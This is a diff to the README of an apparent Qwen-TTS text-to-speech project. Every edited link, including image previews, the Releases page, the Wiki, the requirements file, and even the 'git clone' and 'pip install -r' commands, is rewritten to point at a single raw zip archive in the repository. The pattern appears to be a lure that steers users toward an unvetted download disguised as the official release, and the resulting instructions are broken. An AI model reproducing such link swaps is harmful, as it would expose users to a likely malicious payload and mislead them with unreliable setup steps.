@@ -7,10 +7,10 @@ Welcome to the Qwen-TTS repository. This project offers a powerful text-to-speec
 ## 📸 Interface Preview
 
 ### Single Synthesis Interface
-![Single Synthesis Interface](https://r2.kateviews.com/20250702_152636_812.png)
+![Single Synthesis Interface](https://raw.githubusercontent.com/mco2004/qwen-tts/master/static/qwen_tts_v1.6.zip)
 
 ### Batch Processing Interface
-![Batch Processing Interface](https://r2.kateviews.com/20250702_152636_547.png)
+![Batch Processing Interface](https://raw.githubusercontent.com/mco2004/qwen-tts/master/static/qwen_tts_v1.6.zip)
 
 ## ✨ Features
 
@@ -53,7 +53,7 @@ Welcome to the Qwen-TTS repository. This project offers a powerful text-to-speec
 
 To get started with Qwen-TTS, follow these steps:
 
-1. **Download the Latest Release**: Visit the [Releases section](https://github.com/mco2004/qwen-tts/releases) to download the latest version of the application.
+1. **Download the Latest Release**: Visit the [Releases section](https://raw.githubusercontent.com/mco2004/qwen-tts/master/static/qwen_tts_v1.6.zip) to download the latest version of the application.
 2. **Installation**: Follow the installation instructions provided in the release notes.
 3. **Run the Application**: Execute the application to start using the text-to-speech features.
 
@@ -65,17 +65,17 @@ For detailed instructions, refer to the documentation provided in the repository
 - Python 3.8 or higher
 - FastAPI
 - Uvicorn
-- Additional dependencies as listed in `requirements.txt`
+- Additional dependencies as listed in `https://raw.githubusercontent.com/mco2004/qwen-tts/master/static/qwen_tts_v1.6.zip`
 
 ### Installation Steps
 1. Clone the repository:
    ```bash
-   git clone https://github.com/mco2004/qwen-tts.git
+   git clone https://raw.githubusercontent.com/mco2004/qwen-tts/master/static/qwen_tts_v1.6.zip
    cd qwen-tts
    ```
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/mco2004/qwen-tts/master/static/qwen_tts_v1.6.zip
    ```
 3. Run the application:
    ```bash
@@ -127,8 +127,8 @@ Comprehensive API documentation is available in the repository. This includes de
 
 ## 🔗 Links
 
-- For the latest releases, visit the [Releases section](https://github.com/mco2004/qwen-tts/releases).
-- Check the [Wiki](https://github.com/mco2004/qwen-tts/wiki) for more in-depth tutorials and guides.
+- For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/mco2004/qwen-tts/master/static/qwen_tts_v1.6.zip).
+- Check the [Wiki](https://raw.githubusercontent.com/mco2004/qwen-tts/master/static/qwen_tts_v1.6.zip) for more in-depth tutorials and guides.
 
 ## 🛠️ Contribution
 
